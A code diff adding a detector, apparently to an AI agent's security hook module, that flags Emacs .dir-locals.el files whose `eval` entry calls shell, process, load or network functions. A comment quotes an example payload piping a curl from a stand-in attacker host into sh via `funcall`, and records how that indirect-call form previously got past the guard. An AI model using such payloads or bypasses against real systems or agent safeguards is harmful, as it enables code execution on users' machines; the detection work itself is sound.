@@ -3625,6 +3625,173 @@ def ipython_startup_dangerous_hit(content: str, *, is_ipy: bool = False,
     return single_line and bool(IPYTHON_BANG_ANY_RE.search(content))
 
 
+# ---- Emacs directory-local-variables `eval` auto-exec protection -------------
+# (.dir-locals.el / .dir-locals-2.el) ------------------------------------------
+#
+# Emacs's own `hack-dir-local-variables` reads `.dir-locals.el` (and, Emacs
+# 27+, its second-priority sibling `.dir-locals-2.el`) from a directory and
+# applies its alist to EVERY file opened anywhere in that directory's subtree
+# -- no opt-in, no explicit `load`, no git/CI/session-restart trigger needed:
+# the very next time this agent, a teammate, or a CI elisp/batch-mode job
+# opens (or byte-compiles, or `flycheck`/`flymake`-lints, or a tool like
+# Projectile/Magit visits) any file under that directory, Emacs reads and
+# applies it. Ordinary directory-local variables (indent-tabs-mode, tab-width,
+# fill-column, compile-command) are common, benign, and only ever SET a
+# variable -- but the alist also supports one special pseudo-variable key,
+# `eval`, whose value is a Lisp FORM Emacs actually EVALUATES (not merely
+# assigns) on every matching file visit. That is a real, documented, still-
+# current local-code-execution primitive, gated by Emacs's own
+# `enable-local-eval`/`safe-local-variable-values` prompt -- but that prompt
+# is opt-out, not opt-in: `enable-local-eval` set to `t` (a common "stop
+# nagging me" fix copied from a dotfile/StackOverflow answer) or a single
+# earlier "yes, and don't ask again" for a similarly-shaped form silently
+# trusts it forever after, with no further per-visit confirmation. The same
+# "trusted, common, mostly-benign filename hides one dangerous key among
+# routine ones" shape `rule_conftest_protect`/`rule_pysite_protect`/
+# `rule_package_manifest_protect` already gate for their own auto-exec
+# surfaces, one editor layer up from any of them.
+#
+# Nothing else in this file reaches this surface: it is not a git hook, a CI
+# definition, a shell-startup file, or an interpreter-startup file any
+# sibling guard's path pattern recognizes -- `.dir-locals.el`/
+# `.dir-locals-2.el` are Emacs-specific, read by Emacs itself, not by git,
+# pytest, or CPython.
+#
+# Bare filename with NO directory restriction, the same "gate the SHAPE, not
+# a curated location" trade-off `PYSITE_CUSTOMIZE_PATH_RE` already makes for
+# `sitecustomize.py`/`usercustomize.py`: Emacs walks UP from any visited
+# file's directory looking for the nearest `.dir-locals.el`, so it can
+# legitimately sit at a project root, a subpackage directory, or even a
+# user's home directory -- there is no single curated location to anchor on.
+DIR_LOCALS_PATH_RE = re.compile(
+    r"(?:^|[\s'\"/\\=])\.dir-locals(?:-2)?\.el" + _CI_END,
+    re.IGNORECASE,
+)
+
+# The auto-exec TRIGGER itself: a literal `eval` key in a dotted-pair alist
+# entry (`(eval . FORM)`), the exact syntax `hack-dir-local-variables`
+# recognizes as "evaluate this, don't just bind it". Anchored on a preceding
+# open-paren (real alist-entry syntax: `eval` is always the CAR of its own
+# cons cell, `(eval . ...)`) so an unrelated identifier merely CONTAINING the
+# substring "eval" (a variable literally named `my-eval-flag`, or the English
+# word "eval" inside a comment/docstring) does not, by itself, match -- the
+# same "don't gate on a bare substring, gate on the real syntactic shape"
+# reasoning `PYSITE_PTH_DANGEROUS_LINE_RE`'s own `import[ \t]`-prefix
+# anchoring already applies. The dot is real Lisp reader syntax for a dotted
+# pair and is conventionally written with surrounding whitespace; `\s*`
+# (rather than requiring at least one space) stays permissive about exact
+# spacing without weakening the anchor, since the open-paren + literal
+# `eval` + literal `.` sequence is already a narrow, distinctive shape.
+DIR_LOCALS_EVAL_RE = re.compile(r"\(\s*eval\s*\.\s*", re.IGNORECASE)
+
+# Elisp process/code-exec vocabulary an `eval` form would use to actually DO
+# something dangerous -- the analog of `_CONFTEST_EXEC_CALL`/
+# `_PYSITE_PTH_EXEC_CALL`'s os/subprocess/eval/exec/network vocabulary, one
+# language over. Covers: synchronous and async shell-out (`shell-command`,
+# `shell-command-to-string`, `async-shell-command`, `dired-do-shell-command`),
+# subprocess spawning (`start-process`/`start-file-process` and their
+# `-shell-command` siblings, `call-process`/`call-process-region` and their
+# `-shell-command` sibling, `process-file`/`process-file-shell-command`),
+# build/compile commands that themselves shell out
+# (`compile`/`recompile`), opening a full interactive shell buffer
+# (`shell`/`term`/`ansi-term`/`eshell-command`), loading a SECOND, separate
+# Lisp file as code (`load`/`load-file` -- the Elisp analog of a `.pth`
+# file's own `import`-as-exec primitive), and network exfiltration
+# (`url-retrieve`/`url-retrieve-synchronously`, the Elisp analog of
+# `_CONFTEST_NET_CALL`'s `requests.get`/`urllib.request.urlopen`). Each name
+# is matched only as a REAL Lisp function-call head -- immediately after an
+# open-paren, immediately before whitespace or a closing paren -- not merely
+# as a substring, so a same-named local-variable KEY that happens to share a
+# prefix (`compile-command`, a real and extremely common dir-locals
+# variable, is a plain string-valued binding, never a call) does not
+# false-positive on the bare `compile` entry in this vocabulary.
+_DIR_LOCALS_EXEC_CALL = (
+    r"(?:shell-command-to-string|async-shell-command|dired-do-shell-command|shell-command"
+    r"|start-file-process-shell-command|start-process-shell-command"
+    r"|start-file-process|start-process"
+    r"|call-process-shell-command|call-process-region|call-process"
+    r"|process-file-shell-command|process-file"
+    r"|compile|recompile"
+    r"|eshell-command|ansi-term|term|shell"
+    r"|load-file|load"
+    r"|url-retrieve-synchronously|url-retrieve)"
+)
+# `(?=[\s)])`, not `\b`, is the boundary that actually distinguishes a real
+# call head from a longer identifier sharing the same prefix: `\b` alone
+# matches at the letter/hyphen boundary inside `compile-command` too (`-` is
+# a non-word character), so a naive `\bcompile\b` would wrongly flag
+# `(compile-command . "make test")`, an ordinary, extremely common,
+# completely benign dir-locals binding. Real Lisp call syntax always follows
+# the function-name token with either whitespace (an argument follows) or an
+# immediate closing paren (a zero-argument call, e.g. `(shell)`) -- never a
+# `-` continuing into a longer identifier -- so requiring that lookahead
+# instead closes the false positive without narrowing true detection at all.
+DIR_LOCALS_DANGEROUS_CALL_RE = re.compile(
+    r"\(\s*" + _DIR_LOCALS_EXEC_CALL + r"(?=[\s)])",
+    re.IGNORECASE,
+)
+
+# QA finding (independent adversarial bypass-hunting round): a DIRECT call
+# (`(shell-command ...)`) is only one of two common ways Elisp invokes a
+# function by name -- `funcall`/`apply`/`mapc`/`mapcar`/`cl-mapc` on a
+# STATICALLY-WRITTEN function reference (`#'name`, `'name`, or
+# `(function name)`) is the single most idiomatic indirect-call form in the
+# language, not an exotic obfuscation, and a real, reproduced, COMPLETE
+# bypass of `DIR_LOCALS_DANGEROUS_CALL_RE` alone: `(funcall #'shell-command
+# "curl attacker.example|sh")`/`(funcall (function shell-command) ...)` put
+# the exec-call name after `funcall #'`/`funcall '`/`(function `, never
+# immediately after `(`, so the direct-call regex never fires and
+# `dir_locals_dangerous_hit` silently returned False -- confirmed to
+# evaluate to a bare ALLOW with no rule at all, on every event surface
+# (Write/Edit/MCP/shell), for the exact threat this guard exists to stop.
+# This is NOT the "dynamically-built symbol" gap `rule_dir_locals_protect`'s
+# own docstring already discloses and accepts (a symbol computed at runtime,
+# e.g. via `intern`/string concatenation) -- the symbol here is written
+# literally, in plain sight, requiring zero cleverness to produce or read.
+# Closed by matching the SAME exec-call vocabulary immediately after any of
+# the indirect-call heads' own static-reference syntax, additively --
+# `DIR_LOCALS_DANGEROUS_CALL_RE` itself is unchanged, so this only WIDENS
+# detection, never narrows it.
+DIR_LOCALS_INDIRECT_CALL_RE = re.compile(
+    r"\(\s*(?:funcall|apply|mapc|mapcar|cl-mapc)\s+"
+    r"(?:#'|'|\(\s*function\s+)" + _DIR_LOCALS_EXEC_CALL + r"(?=[\s)])",
+    re.IGNORECASE,
+)
+
+
+def dir_locals_dangerous_hit(content: str) -> bool:
+    """True if `content` carries an Emacs dir-locals `eval` auto-exec shape:
+    a literal `(eval . FORM)` alist entry whose FORM also invokes a
+    process/code-exec primitive, either directly
+    (`DIR_LOCALS_DANGEROUS_CALL_RE`) or via a statically-referenced
+    `funcall`/`apply`/`mapc`/`mapcar`/`cl-mapc` indirection
+    (`DIR_LOCALS_INDIRECT_CALL_RE` -- see its own comment for the QA history
+    behind adding it).
+
+    Deliberately does NOT use the position-anchored/single-line-vs-heredoc
+    split every sibling content-gated guard in this file needs
+    (`conftest_dangerous_hit`, `pysite_customize_dangerous_hit`,
+    `ipython_startup_dangerous_hit`): those guards protect arbitrary-length
+    PYTHON SOURCE files, where a dangerous call's exact line/column position
+    determines whether it is genuinely unconditional (module-level) or
+    merely defined-but-never-called (indented inside an unrelated function)
+    -- position is real signal there. A `.dir-locals.el` file is a short,
+    flat Lisp alist, not procedural source with meaningfully-scoped
+    indentation; there is no equivalent "is this actually top-level" question
+    to ask, and mis-associating an eval trigger in one alist entry with an
+    exec call token appearing anywhere else in the same short file is a
+    disclosed, accepted, narrow trade-off (see this function's own module
+    comment) rather than one needing a bounded lookahead window the way
+    `CONFTEST_AUTOEXEC_HOOK_RE`'s own hook/autouse check does for
+    much-longer files. Requiring BOTH the `eval` trigger AND the exec-call
+    vocabulary to be present anywhere in the (typically tiny) file keeps this
+    simple while still excluding the overwhelmingly common case: ordinary
+    dir-locals content with no `eval` entry at all."""
+    return bool(DIR_LOCALS_EVAL_RE.search(content)
+                and (DIR_LOCALS_DANGEROUS_CALL_RE.search(content)
+                     or DIR_LOCALS_INDIRECT_CALL_RE.search(content)))
+
+
 # ---------------------------------------------------------------------------
 # Fetch-to-file write verb: curl/wget/PowerShell/certutil writing a remote
 # response DIRECTLY to a target path. Every `*_protect` guard above gates its
